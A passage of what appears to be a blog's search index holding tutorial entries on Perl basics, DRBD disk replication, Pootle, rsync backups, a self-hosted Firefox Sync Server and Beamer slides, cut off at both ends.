s/(toto|titi)/\\u$1/gi; # Will give Toto or Titi You can also combine them so that everything is lowercase except the first letter:\ns/(toto|titi)/\\u\\L$1/gi; # Will give Toto or Titi You can even do this in a simple print:\nprint \"His name is \\u\\L$name\\E\\n\"; split linkSplit allows cutting based on a space, tab, period… pretty much anything except commas:\n@fields = split /separator/, $string; Split moves the pattern in a string and returns the list of fields separated by separators. Each match of the pattern corresponds to the end of one field and the beginning of another:\n@fields = split /:/, \"abc:def:ij:k::m\"; # Will give (\"abc\", \"def\", \"ij\", \"k\", \"\", \"m\") As I mentioned above, it’s also possible to make separations with spaces:\nmy $phrase = \"Here is my line\\t of spaces.\\n\" my @args = split /\\s+/, $phrase; # Gives (\"Here\", \"is\", \"my\", \"line\", \"of spaces.\" By default, if no separation options are specified, “\\s+” will be used.\njoin linkJoin works exactly like split except that its result will give the inverse of split. It will join pieces (with or without) separators:\nmy @mac = join \":\", 00, AB, EF, EF, EF, EF; # Will give 00:AB:EF:EF:EF:EF or even:\nmy $mac = join \":\", 00, AB, EF, EF, EF, EF; # Will give 00:AB:EF:EF:EF:EF More Complex Control Structures linkunless linkUnless is the opposite of if, that is, we’ll enter the loop if the searched expression is not the right one. It’s actually equivalent to an else in an if loop. This also equates to making an if negative:\nif ( ! ( $toto =~ /Â-Z_]\\w*$/i) ) \u003c--\u003e unless ($toto =~ /Â-Z_]\\w*$/i) It is also, just like an if, possible to use else with unless, but I don’t recommend it as it’s often a source of errors.\nuntil linkIf you want to invert the condition of the while loop:\nuntil ($j \u003e $i) { $j *= 2; } This is actually a disguised while loop that repeats as long as the condition is false.\nExpression Modifiers linkFor a more compact notation, an expression can be followed by a modifier that controls it:\nprint \"$n is a negative number.\\n\" if $n \u003c 0; \u0026error(\"Invalid input\") unless \u0026valid($input); $i *= 2 until $i \u003e $j; print \" \", ($n += 2) while $n \u003c 10; \u0026greet($_) foreach @person; Bare Block linkThis is a bare block:\n{ body; body; body; } It’s a block that will be executed only once. The advantage is that we can create variables, but they will only be kept in this block.\nelsif linkIn an if loop, if we want to have multiple solutions, we can use elsif:\nif (! defined $toto) { print \"The value is undef.\\n\"; } elsif ($toto eq '') { print \"The value is a string.\\n\"; else { ... } We can put as many elsif as we want (see perlfaq to emulate case or switch).\nAuto Increment/Decrement linkAs in C, to increment a variable for example:\nmy $a = 5; my $b = $a++; # can also be written as ++$a Same with “–” for decrementing\nfor linkFor is quite classic and resembles C again:\nfor ($i = 1; $i \u003c=10; $i++) { print \"I can count to $i!\\n\"; } Another example. Imagine that we want to count from -150 to 1000 but in steps of 3:\nfor ($i = -150; $i \u003c= 1000; $i +=3) { print \"$i\\n\"; } Otherwise, a simple for loop for a successful search:\nfor ($_ = \"toto\"; s/(.)//; ) { print \"$1 is found here\\n\"; } Be careful with infinite loops if you use variables:\nfor (;;) { print \"Infinite loop\\n\"; } If you really want to write an infinite loop, the best way is this:\nfor (1) { print \"Infinite loop\\n\"; } foreach linkThe loop and for and foreach are identical except that if there’s no “;”, it’s a foreach loop:\nfor (1..10) { # Actually a foreach loop from 1 to 10 print \"I can count to $_!\\n\"; } So it’s a foreach loop but written with a for.\nLoop Controls link“last” allows to terminate a loop immediately (like break in C or shell):\nwhile () { if (/_END_/) { last; } elsif (/fred/) { print; } } As soon as a line contains the “END” marker, the loop ends.\nnext linkSometimes, you’re not prepared for the loop to end, but you’ve finished the current iteration. This is where “next” comes in! It jumps to the inside of the bottom of the loop, then it goes to the next iteration of the loop:\nwhile (\u003c\u003e) { foreach (split) { # splits $_ into words, assigning each to $_ in turn $total++; next if /\\W/; # strange words skip the rest of the loop $valid++; $count{$_}++; # count each individual word ## next leads here ## } } print \"total = $total, valid words = $valid\\n\"; foreach $word (sort keys %count) { print \"$word was encountered $count{$word} times.\\n\"; } redo linkRedo indicates to go back to the beginning of the current loop block without going further in the loop:\nmy @words = qw{ toto tata titi }; my $errors = 0; foreach (@words) { ## redo comes back here ## print \"Enter the word '$_': \"; chomp(my $try = ); if ($try ne $_) { print \"Sorry - There is an error.\\n\\n\"; $errors++; redo; # go back to the top of the loop } } print \"You finished the test with $errors errors.\\n\"; A small test to understand well:\nforeach (1..10) { print \"Iteration number $_.\\n\\n\"; print \"Choose: last, next, redo or none\"; chomp(my $choice = ); print \"\\n\"; last if $choice =~ /last/i; next if $choice =~ /next/i; redo if $choice =~ /redo/i; print \"That wasn't any of the choices... moving on!\\n\\n\"; } print \"That's all, folks!\\n\"; Labeled Blocks linkLabeled blocks are used to work with loop blocks. They are made of letters, underscores, numbers but cannot start with the latter. It is advised to name them with capital letters. In reality, labels are rare. But here’s an example:\nLINE: while (\u003c\u003e) { foreach (split) { last LINE if /__END__/; # exits the LINE loop ...; } } Logical Operators linkLike in shell:\n\u0026\u0026 (AND): executes what follows if the previous condition is true. Also allows to say that the expression before and the one that will follow must be validated to perform what follows. || (OR): executes what follows if the previous condition is false. Also allows to say that if the expression before doesn’t match, the following must match to be able to continue. if ($dessert{'cake'} \u0026\u0026 $dessert{'ice cream'}) { # Both are true print \"Hooray! Cake and ice cream!\\n\"; } elsif ($dessert{'cake'} || $dessert{'ice cream'}) { # At least one is true print \"It's still good...\\n\"; } else { # Neither is true } We can also write like this:\n$hour = 3; if ( (9 \u003c= $hour) \u0026\u0026 ($hour \u003c 18) ) { print \"Shouldn't you be working?\\n\"; They are also called short-circuit operators, because in the example below, the left operator needs to check the right one to avoid a division by 0:\nif ( ($n != 0) \u0026\u0026 ($total/$n \u003c 5) ) { print \"The average is less than 5.\\n\"; } Unlike other languages, the value of a short-circuit operator is the last part evaluated, not a simple boolean value.\nTernary Operator link expression ? expr_if_true : expr_if_false The ternary operator looks like an if-then-else. We first check if the expression is true or false:\nIf it’s true, the 2nd expression is used, otherwise the third. Each time, one of the 2 right expressions is evaluated and the other ignored. If the first expression is true the 2nd is evaluated and the 3rd ignored. If the 1st is false, the 2nd is ignored and the 3rd evaluated as the value of the whole. my $place = \u0026is_weekend($day) ? \"home\" : \"work\"; Here’s another example:\nmy $average = $n ? ($total/$n) : \"No average\"; print \"Average: $average\\n\"; A slightly more elegant example:\nmy $size = ($width \u003c 10) ? \"small\" : ($width \u003c 20) ? \"medium\" : ($width \u003c 50) ? \"large\" : \"very large\"; # Default One last example:\n($a \u003c $b) ? ($a = $c) : ($b = $c); File Handles and File Tests linkFile handles are named like other Perl identifiers (with letters, digits, and underscores, without starting with a digit) but since they don’t have a prefix, they can be confused with current or future reserved words. It is therefore advised to use only capital letters for a file handle name.\nToday there are 6 file handle names used by Perl for its own use:\nSTDIN STDOUT STDERR DATA ARGV ARGVOUT You may see these handles written in lowercase in some scripts, but that doesn’t always work, which is why it’s advised to put everything in uppercase.\nA program’s output is called STDOUT, and we’ll see how to redirect this output. You can take a look at the Perlport documentation.\nRunning Programs linkHere are 2 ways to read your program:\n$ ./my_soft titi This will read the input toto and send the output to titi.\n$ cat toto | ./my_soft | grep stuff This will take the input toto, send it to my soft and grep the output of my soft.\nFor error redirection:\n$ ps aux | ./my_soft 2\u003e/var/log/my_soft.err Opening a Handle linkHere’s how to open files:\nopen FILER, \"toto\"; open FILER, \""
            }
        );
    index.add(
            {
                id:  206 ,
                href: "\/Installation_et_configuration_de_DRBD\/",
                title: "Installation and Configuration of DRBD",
                description: "How to set up and configure DRBD for disk replication across nodes in a network for high availability",
                content: "Introduction linkDRBD is a system that allows you to create software RAID1 over a local network. This enables high availability and resource sharing on a cluster without a disk array.\nHere we will install DRBD8, with the goal of implementing a cluster filesystem (see documentation on OCFS2) which is not supported on DRBD7. We’ll use the DRBD8 packages from Debian repositories. We’ll work on a 2-node cluster.\nInstallation linkFirst, install the following packages:\naptitude install drbd8-utils Then we’ll load the module and make it persistent (for future reboots):\nmodprobe drbd echo \"drbd\" \u003e\u003e /etc/modules Configuration linkdrbd.conf linkThe drbd.conf file is pretty good by default as it allows you to write an extensible configuration:\n# You can find an example in /usr/share/doc/drbd.../drbd.conf.example include \"drbd.d/global_common.conf\"; include \"drbd.d/*.res\"; I didn’t modify it.\nglobal_common.conf linkThis file is the default file, which can contain host configurations, but also allows you to have a global configuration for your different DRBD configurations (common section):\n# Global configuration global { # Do not report statistics usage to LinBit usage-count no; } # All resources inherit the options set in this section common { # C (Synchronous replication protocol) protocol C; startup { # Wait for connection timeout (in seconds) wfc-timeout 1 ; # Wait for connection timeout, if this node was a degraded cluster (in seconds) degr-wfc-timeout 1 ; } net { # Maximum number of requests to be allocated by DRBD max-buffers 8192; # The highest number of data blocks between two write barriers max-epoch-size 8192; # The size of the TCP socket send buffer sndbuf-size 512k; # How often the I/O subsystem's controller is forced to process pending I/O requests unplug-watermark 8192; # The HMAC algorithm to enable peer authentication at all cram-hmac-alg sha1; # The shared secret used in peer authentication shared-secret \"xxx\"; # Split brains # Split brain, resource is not in the Primary role on any host after-sb-0pri disconnect; # Split brain, resource is in the Primary role on one host after-sb-1pri disconnect; # Split brain, resource is in the Primary role on both host after-sb-2pri disconnect; # Helps to solve the cases when the outcome of the resync decision is incompatible with the current role assignment rr-conflict disconnect; } handlers { # If the node is primary, degraded and if the local copy of the data is inconsistent pri-on-incon-degr \"echo Current node is primary, degraded and the local copy of the data is inconsistent | wall \"; } disk { # The node downgrades the disk status to inconsistent on io errors on-io-error pass_on; # Disable protecting data if power failure (done by hardware) no-disk-barrier; # Disable the backing device to support disk flushes no-disk-flushes; # Do not let write requests drain before write requests of a new reordering domain are issued no-disk-drain; # Disables the use of disk flushes and barrier BIOs when accessing the meta data device no-md-flushes; } syncer { # The maximum bandwidth a resource uses for background re-synchronization rate 500M; # Control how big the hot area (= active set) can get al-extents 3833; } } I’ve commented all my changes.\nr0.res linkNow we’ll create a file to add our resource 0:\nresource r0 { # Node 1 on srv1 { device /dev/drbd0; # Disk containing the drbd partition disk /dev/mapper/datas-drbd; # IP address of this host address 192.168.100.1:7788; # Store metadata on the same device meta-disk internal; } # Node 2 on srv2 { device /dev/drbd0; disk /dev/mapper/lvm-drbd; address 192.168.20.4:7788; meta-disk internal; } } Synchronization linkWe need to launch the first sync now.\nOn both nodes, run this command:\ndrbdadm create-md r0 Still on both nodes, run this command to activate the resource:\ndrbdadm up r0 Node 1 linkWe’ll ask the first node to do the first block-by-block replication:\ndrbdadm -- --overwrite-data-of-peer primary r0 Then we’ll have to wait for the sync to finish before continuing:\n\u003e cat /proc/drbd version: 8.3.7 (api:88/proto:86-91) srcversion: EE47D8BF18AC166BE219757 0: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r---- ns:912248 nr:0 dw:0 dr:920640 al:0 bm:55 lo:1 pe:388 ua:2048 ap:0 ep:1 wo:b oos:3283604 [===\u003e................] sync'ed: 21.9% (3283604/4194304)K finish: 1:08:24 speed: 580 (452) K/sec The display of /proc/drbd allows you to see the replication status. At the end, you should have something like this:\n\u003e cat /proc/drbd version: 8.3.7 (api:88/proto:86-91) srcversion: EE47D8BF18AC166BE219757 0: cs:Connected ro:Secondary/Primary ds:UpToDate/UpToDate C r---- ns:0 nr:4194304 dw:4194304 dr:0 al:0 bm:256 lo:0 pe:0 ua:0 ap:0 ep:1 wo:b oos:0 Node 2 linkIf you want to do dual master, this option must be active in the configuration:\nresource startup { become-primary-on both; } net { protocol C; allow-two-primaries yes; } } Now we can activate the other node as primary:\ndrbdadm primary r0 Once the synchronization is complete, DRBD is installed and properly configured. You now need to format the device /dev/drbd0 with a filesystem, such as ext3 for active/passive or OCFS2 for example if you want active/active (there are others like GFS2).\nmkfs.ext3 /dev/drbd0 or\nmkfs.ocfs2 /dev/drbd0 Then mount the volume in a folder to access the data:\nmount /dev/drbd0 /mnt/data Only a primary node can mount and access the data on the DRBD volume. When DRBD works with HeartBeat in CRM mode, if the primary node goes down, the cluster is able to switch the secondary node to primary. When the old primary is “UP” again, it will synchronize and become a secondary in turn.\nUsage linkBecome master linkTo set all volumes as primary:\ndrbdadm primary all info Replace all with the name of your volume if you only want to operate on one. Become slave linkTo set a volume as slave:\ndrbdadm secondary all Manual synchronization linkTo start a manual synchronization (will invalidate all your data):\ndrbdadm invalidate all To do the same but on other nodes:\ndrbdadm invalidate_remote all FAQ linkMy sync doesn’t work, I have: Secondary/Unknown linkIf you have this type of message:\n\u003e cat /proc/drbd version: 8.3.7 (api:88/proto:86-91) srcversion: EE47D8BF18AC166BE219757 0: cs:StandAlone ro:Secondary/Unknown ds:Inconsistent/DUnknown r---- ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:b oos:4194304 You need to check if the machines are properly configured for your resources and also if they can telnet to each other (firewalling etc…)\nWhat to do in case of split brain? linkIf you find yourself in this situation:\n\u003e cat /proc/drbd primary/unknown or\nsecondary/unknown Unmount the drbd volumes On the primary: drbdadm connect all On the secondary (this will destroy all data and reimport from the master) drbdadm -- --discard-my-data connect all Resources linkDocumentation on Heartbeat2 Xen cluster with drbd8 and OCFS2\nDRBD 8 3 Third Node Replication\nDRBD advanced usages\n"
            }
        );
    index.add(
            {
                id:  207 ,
                href: "\/Pootle_:_simple_translation_tool\/",
                title: "Pootle: Simple Translation Tool",
                description: "A guide on how to install and configure Pootle, a simple online translation tool that makes the translation process easier and allows crowd-sourced translations.",
                content: " Software version 2.5.0 Operating System Debian 6 Website Pootle Website Last Update 06/09/2013 Introduction linkPootle1 is an online tool that makes the process of translating so much simpler. It allows crowd-sourced translations, easy volunteer contribution and gives statistics about the ongoing work.\nPootle is built using the powerful API of the Translate Toolkit and the Django framework:\nInstallation linkYou can install Poole directly from the packages, but you won’t have the latest version. To get it we’ll need to install required packages and download all dependencies via PIP:\naptitude install python-pip gcc python2.6-dev libxslt1-dev python-virtualenv Then install and create the python virtual environment:\nvirtualenv /var/www/pootle/env/ source /var/www/pootle/env/bin/activate And finally install Pootle:\npip install pootle Configuration linkPootle linkThen you can initiate the configuration:\npootle init /var/www/pootle/pootle.conf Edit the configuration to change allowed host to access to the web frontend (/var/www/pootle/pootle.conf):\n# A list of strings representing the host/domain names that this Pootle server # can serve. This is a Django's security measure. More details at # https://docs.djangoproject.com/en/dev/ref/settings/#allowed-hosts ALLOWED_HOSTS = ['127.0.0.1'] # Allow all # ALLOWED_HOSTS = ['*'] warning Edit the configuration and setup the MySQL database instead of the SQLite by default And launch it:\npootle --config=/var/www/pootle/pootle.conf start You’ll now get an access to the web interface: http://127.0.0.1:8000\nCredentials are: admin/admin\ninfo The first launch will take a few minutes as it populate the database Apache linkTo avoid typing port number on the URL, you can use Apache mod proxy.\naptitude install apache2 apache2-utils apache2.2-common libapache2-mod-proxy-html Then activate modules:\na2enmod proxy_connect a2enmod proxy_http a2enmod proxy_html And restart Apache.\nThen configure your apache (/etc/apache2/sites-enabled/pootle):\nServerAdmin webmaster@localhost ServerName pootle.deimos.fr # Pootle order deny,allow allow from all ProxyPass http://server:8000/ ProxyPassReverse http://server:8000/ You’ll need to enable this new site and restart Apache.\nReferences link http://pootle.translatehouse.org/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  208 ,
                href: "\/Rsync_:_Sauvegarde_incr%C3%A9mentale\/",
                title: "Rsync: Incremental Backup",
                description: "Guide on how to use Rsync for incremental backups, including manual examples and script resources",
                content: "Scripts and Programs linkThere are scripts and programs available to facilitate the use of this solution:\nEasy Automated Snapshot-Style Backups with Linux and Rsync rsnapshot A Manual Example linkYou want to copy your disk/backup a partition.\nAssuming you have created a partition on another disk and mounted it (in this example /mnt/usbharddrivemain):\nDuplicate a partition: rsync --progress --stats -avxzl --exclude \"/mnt/usbharddrivemain/\" --exclude \"/mnt/usbharddriveboot/\" --exclude \"/usr/portage/\" --exclude \"/proc/\" --exclude \"/root/.ccache/\" --exclude \"/var/log/\" --exclude \"/sys\" --exclude \"/dev\" --exclude \"tmp/\" /* /mnt/usbharddrivemain Duplicate a partition and delete files that are no longer current (that have been deleted from the source partition): rsync --progress --stats --delete -avxzl --exclude \"/mnt/usbharddrivemain/\" --exclude \"/mnt/usbharddriveboot/\" --exclude \"/usr/portage/\" --exclude \"/proc/\" --exclude \"/root/.ccache/\" --exclude \"/var/log/\" --exclude \"/sys\" --exclude \"/dev\" --exclude \"tmp/\" /* /mnt/usbharddrivemain To backup /boot (another partition): rsync --progress --stats -avxzl /boot /mnt/usbharddriveboot rsync --progress -avxzl --stats --delete /boot /mnt/usbharddriveboot To restore, you can boot from the second hard drive or use a Live CD. Repeat the previous commands by changing the source and destination, for example: /mnt/usbharddrivemain /mnt/driveToRestoreTo.\nYou may encounter problems with certain files, such as LDAP databases. To work around this issue, use the ‘Sparse’ option: rsync -avxzl --sparse /var/lib/ldap/mdb/db/data.mdb /mnt/usbharddriveboot To synchronize via SSH: rsync -e ssh -av --delete \"/rsync\" remote:backupdir Resources linkIncremental Backup Server\nBacking up your data with Rsync\nInformation about Rsync memory consumption\n"
            }
        );
    index.add(
            {
                id:  209 ,
                href: "\/Firefox_Sync_Server_create_your_own_Sync_Server\/",
                title: "Firefox Sync Server: Create Your Own Sync Server",
                description: "How to install and configure your own Firefox Sync Server for synchronizing Firefox data across multiple devices",
                content: " Operating System Debian 7 Website Firefox Sync Server Website Last Update 05/09/2013 Others MariaDB 5.5 Introduction linkFirefox Sync, originally branded Mozilla Weave, is a browser synchronization feature that allows users to partially synchronize bookmarks, browsing history, preferences, passwords, filled forms, add-ons and the last 25 opened tabs across multiple computers.\nIt keeps user data on Mozilla servers, but the data is encrypted in such a way that no third party, not even Mozilla, can access user information.\nFirefox Sync was originally an add-on for Mozilla Firefox 3.x and SeaMonkey 2.0, but it has been a built-in feature since Firefox 4.0 and SeaMonkey 2.1.1\nPrerequisite linkFirst of all, we need to install those dependencies:\naptitude install python-dev mercurial python-virtualenv make gcc Then we will install MariaDB.\nTo install MariaDB, it’s unfortunately not embedded in Debian, so we’ll add a repository. First of all, install a python tool to get aptkey:\naptitude install python-software-properties Then let’s add this repository (https://downloads.mariadb.org/mariadb/repositories/):\napt-key adv --recv-keys --keyserver keyserver.ubuntu.com 0xcbcb082a1bb943db add-apt-repository 'deb http://mirrors.linsrv.net/mariadb/repo/10.0/debian wheezy main' We’re now going to change apt pinning to prioritize MariaDB’s repository (/etc/apt/preferences.d/mariadb):\nPackage: * Pin: release o=MariaDB Pin-Priority: 1000 Then install MariaDB:\naptitude update aptitude install mariadb-server Now we will need that package also to be able to build the server.\naptitude install libmariadbclient-dev Installation linkWe can now get the sources:\ncd /usr/share hg clone https://hg.mozilla.org/services/server-full firefox_sync cd firefox_sync And launch the build:\n\u003e make build [...] Building the app Checking the environ [ok] Updating the repo [ok] Building Services dependencies Getting server-core [ok] Getting server-reg [ok] Getting server-storage [ok] [ok] Building External dependencies [ok] Now building the app itself [ok] [done] Let’s install the latest Python module and Guinicorn (WSGI HTTP Server):\n./bin/pip install Mysql-Python ./bin/pip install gunicorn We are going to create a dedicated user for this application and reset rights:\ngroupadd firefoxsync useradd -d /usr/share/firefox_sync -g firefoxsync -r -s /bin/bash firefoxsync chown -Rf firefoxsync. /usr/share/firefox_sync Configuration linkAlright, all the installation is now finished. Let’s configure everything.\nMariaDB linkYou need to create a database and user (fit with your informations):\nCREATE DATABASE firefox_syncdb; CREATE USER 'firefox_sync'@'localhost' IDENTIFIED BY 'password'; GRANT ALL ON firefox_syncdb.* TO 'firefox_sync'@'localhost' IDENTIFIED BY 'password'; FLUSH privileges; Sync Server linkEdit the configuration to set database informations (etc/sync.conf):\n[captcha] use = true public_key = xxxxxxxxxxxxxxxxxxxxxxxx private_key = xxxxxxxxxxxxxxxxxxxxxxxx use_ssl = false [storage] backend = syncstorage.storage.sql.SQLStorage sqluri = mysql://firefox_sync:password@localhost:3306/firefox_syncdb standard_collections = false # Set quota and size use_quota = true quota_size = 5120 pool_size = 100 pool_recycle = 3600 reset_on_return = true display_config = true create_tables = true [auth] backend = services.user.sql.SQLUser sqluri = mysql://firefox_sync:password@localhost:3306/firefox_syncdb pool_size = 100 pool_recycle = 3600 create_tables = true # Uncomment the next line to disable creation of new user accounts. #allow_new_users = false [nodes] # You must set this to your client-visible server URL. fallback_node = http://firefoxsync.deimos.fr:5000/ [smtp] host = localhost port = 25 sender = firefoxsync@mycompany.com [cef] use = true file = syslog vendor = mozilla version = 0 device_version = 1.3 product = weave warning It’s preferable to use SSL connection. If you have autosigned certificates, open manually the URL with firefox to accept them and avoiding errors If you’re not going to use Nginx, check that your firewall port is open on 5000 port number:\niptables -t filter -A INPUT -p tcp --dport 5000 -j ACCEPT For more security and if you’re going to use a web server like Nginx, it’s better to listen only on localhost. In addition, you need to change the ‘use’ parameter from http to gunicorn. And to finish, you also need to change the log path (development.ini):\n... [server:main] use = egg:gunicorn host = 0.0.0.0 port = 5000 workers = 2 timeout = 60 ... [handler_syncserver_errors] class = handlers.RotatingFileHandler args = ('/var/log/firefoxsync/sync-error.log',) level = ERROR formatter = generic Then let’s create those folders:\nmkdir -p /var/log/firefoxsync /var/run/firefoxsync chown firefoxsync. /var/log/firefoxsync /var/run/firefoxsync You can now try to manually launch the server if you want and sync a user:\nsu - firefoxsync -c '/usr/share/firefox_sync/bin/gunicorn_paster /usr/share/firefox_sync/development.ini \u0026' Then kill it once you’ve tested it as we’re going to add an init script for it.\nNginx linkAdapt the configuration to your needs:\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key; ssl_session_timeout 5m; # Force SSL if ($scheme = http) { return 301 https://$host$request_uri; } server_name firefoxsync.deimos.fr; access_log /var/log/nginx/firefoxsync.deimos.fr_access.log; error_log /var/log/nginx/firefoxsync.deimos.fr_error.log; location / { proxy_pass_header Server; proxy_set_header Host $http_host; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_connect_timeout 10; proxy_read_timeout 10; proxy_pass http://localhost:5000/; } # Drop config include drop.conf; } Then enable it:\nln -s /etc/nginx/sites-available/firefoxsync.deimos.fr /etc/nginx/sites-enabled/ service nginx reload Debian linkAs there is no init script to launch it automatically on boot, we’re going to change that (/etc/init.d/firefoxsync):\n#!/bin/bash ### BEGIN INIT INFO # Provides: paster # Required-Start: $all # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: starts the paster server # Description: starts paster ### END INIT INFO DESC=\"Mozilla Sync Server\" PROJECT=/usr/share/firefox_sync VIRTUALENV=$PROJECT PID_DIR=/var/run/firefoxsync PID_FILE=$PID_DIR/firefoxsync.pid LOG_FILE=/var/log/firefoxsync/firefoxsync.log USER=firefoxsync GROUP=firefoxsync PROD_FILE=$PROJECT/development.ini RET_VAL=0 # Load the VERBOSE setting and other rcS variables . /lib/init/vars.sh # Define LSB log_* functions. # Depend on lsb-base (\u003e= 3.2-14) to ensure that this file is present # and status_of_proc is working. . /lib/lsb/init-functions # Activate Python virtual environment source $VIRTUALENV/bin/activate # Change directory to project cd $PROJECT case \"$1\" in start) log_daemon_msg \"Starting $DESC\" mkdir -p /var/run/firefoxsync chown firefoxsync. /var/run/firefoxsync paster serve \\ --daemon \\ --pid-file=$PID_FILE \\ --log-file=$LOG_FILE \\ --user=$USER \\ --group=$GROUP \\ $PROD_FILE \\ start ;; stop) log_daemon_msg \"Stopping $DESC\" paster serve \\ --daemon \\ --pid-file=$PID_FILE \\ --log-file=$LOG_FILE \\ --user=$USER \\ --group=$GROUP \\ $PROD_FILE \\ stop ;; restart|force-reload) log_daemon_msg \"Restarting $DESC\" paster serve \\ --daemon \\ --pid-file=$PID_FILE \\ --log-file=$LOG_FILE \\ --user=$USER \\ --group=$GROUP \\ $PROD_FILE \\ restart ;; status) paster serve \\ --daemon \\ --pid-file=$PID_FILE \\ --log-file=$LOG_FILE \\ --user=$USER \\ --group=$GROUP \\ status ;; *) echo $\"Usage: $0 {start|stop|status|restart|force-reload}\" exit 3 esac exit $RET_VAL Then update it on runlevels and start it:\ncd /etc/init.d chmod 755 firefoxsync update-rc.d firefoxsync defaults /etc/init.d/firefoxsync start Logrotate linkYou will see logs are verbose enough to install a logrotate script (/etc/logrotate.d/firefoxsync):\n/var/log/firefoxsync/*.log { weekly missingok rotate 5 compress delaycompress notifempty create 644 firefoxsync firefoxsync sharedscripts postrotate chown firefoxsync. /var/log/firefoxsync/firefox-sync.log chmod 644 /var/log/firefoxsync/firefox-sync.log endscript } Upgrade linkTo upgrade the sever, simply run those commands as root:\n/etc/init.d/firefox_sync stop cd /usr/share/firefox_sync su - firefoxsync hg pull hg update make build exit /etc/init.d/firefox_sync start Client linkOn the client side, there is one account to create and specify the url of the server. Then you could associate all your device to this account.\nReferences link http://en.wikipedia.org/wiki/Firefox_Sync ↩︎\n"
            }
        );
    index.add(
            {
                id:  210 ,
                href: "\/Beamer_:_create_beautiful_LaTeX_presentations\/",
                title: "Beamer: Create Beautiful LaTeX Presentations",
                description: "A comprehensive guide to using Beamer to create professional LaTeX presentations, with instructions for setup, formatting, and custom themes.",
                content: " Software version 3.24-1 Operating System Debian 7 Website Website Last Update 04/09/2013 Introduction linkBeamer1 is a LaTeX extension to create beautiful slides. The main goal of this tool is to stop spending hours and hours on the look but concentrate on the content of your slides.\nOf course the first time you’ll use it, you certainly spend some hours to understand how it works and it could be more if you never did LaTeX before. But don’t worry it’s possible as it nearly was my case.\nThere are some rules you need to understand if it’s the first time you’re using it:\nIf you need something quick…use LibreOffice or something else If you have a lot of slides to do, Beamer is for you If you absolutely need something clear, beautiful and that looks professional, use Beamer! info I’ve made a custom theme with custom functionalities. Some of them require to load custom functions to work. I’ve added everything in that document as well You can look at a result example here. If you want to grab the sources of that example, you can get it from my Git.\nNow you’re ready for the practice.\nInstallation linkTo use LaTeX/Beamer, you don’t need a lot of things, vim is enough! But I prefer having an IDE to help me on unknown syntax I’d like help, I’m using TexMaker. That’s why we’re going to install it as well:\naptitude install latex-beamer texmaker latexmk texlive-pictures Latexmk is different from pdflatex (the default pdf generator of texmaker). In fact, when you generate your PDF on texmaker (F1 key shortcut), it will generate the summary and other things separately. But you may not have the definitive PDF at the first try, why?\nSimply because this task needs to be performed several times to combine everything (content, summary….) to get the final document. Another solution exists to get a full document at once but will take more time to generate the final document. It’s called latexmk and always should be used to generate final documents.\nCreate a folder containing images, scripts and other required documents:\nmkdir -p beamer/{config,images} touch beamer.tex Then add the theme and custom functions in that folder as well.\nWe’re now going to see how it works and how to write the slides.\nStart document linkLoad libs linkFirst of all you need to know that there is an order when you load libraries. That’s why the first thing to load on your tex file is the libraries that you’re going to use. Edit the beamer.tex file and add:\n% slides format \\documentclass[aspectratio=43]{beamer} %\\documentclass[aspectratio=1610]{beamer} %\\documentclass[aspectratio=169]{beamer} % encoding \\usepackage[english]{babel} \\usepackage[T1]{fontenc} \\usepackage[utf8]{inputenc} % others \\usepackage{microtype} \\usepackage{lmodern} \\usepackage{hyperref} \\usepackage{bookmark} \\usepackage{textcomp} \\usepackage{graphicx} % Symbols \\usepackage{amssymb} \\usepackage{latexsym} % tikz / dia export \\usepackage{tikz} % smart diagram \\usepackage{smartdiagram} % theme \\useinnertheme{rounded} %\\usetheme{default} \\usetheme{deimos} \\usecolortheme{deimos} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% slides format: select your wished slides format (16/9, 4/3, 16/10) encoding: set encoding format for the document and the language others: libs to be able to insert hyperlinks, images… symbols: permit to insert LaTeX symbols like arrows tikz: will allow dia LaTeX exports to be included in the document smart diagram: make beautiful diagram easily with that lib (more info here2) theme: select theme and attributes (choose one here3 or can create your custom theme here4) Document informations linkThe first things you need to add is variables containing document information:\n\\title{{My Title}} \\author{Your Name} \\institute{\\href{http://www.mysite.com}{{\\textcolor{blue}{www.mysite.com}}}} \\date{\\today} \\logo{\\includegraphics[height=5mm]{images/my_logo.png}\\vspace{-7pt}} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Adapt all that information with yours. It will be reused in the future.\nBegin document and first frame linkNow we’re able to begin the document and set the welcome page:\n\\begin{document} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\begin{frame}[plain] \\titlepage \\pdfbookmark[2]{\\inserttitle}{titre} \\begin{center} \\includegraphics[height=10mm]{images/my_logo.png} \\end{center} \\end{frame} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\begin{document}: This is how to start the document \\begin{frame}: This is how your start a frame (slide) [plain]: specify that you don’t want header and footer like on other slides {\\inserttitle}{titre}: is how you insert information already defined above \\includegraphics: permit to insert an image in a slide [height=10mm]: set the image size Summary linkA good thing would be to add a summary! To make it work automatically, add this:\n\\section*{Summary} \\pdfbookmark[2]{Summary}{Summary} \\begin{frame}[shrink]{Summary} \\tableofcontents[hideallsubsections] \\end{frame} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\section: add a section that will appear in the summary (do not show it with the star) [shrink]: shrink automatically the frame in 2 frames if it’s too big \\tableofcontents: show the table of content [hideallsubsections]: hide subsections Frames linkSections and subsections linkWe’re now going to create a section (corresponding to title 1):\n\\section{Title 1 (section)} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% You can create subsection (title 2) like that:\n\\subsection{Title 2 (subsection)} Frames usages 